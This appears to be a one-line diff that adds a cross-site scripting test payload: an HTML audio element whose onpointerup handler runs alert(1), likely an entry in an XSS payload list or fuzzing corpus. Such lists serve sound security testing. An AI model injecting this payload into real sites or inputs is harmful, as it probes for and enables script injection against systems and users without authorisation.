@@ -1,0 +1,1 @@
+<audio onpointerup=alert(1)>XSS</audio>
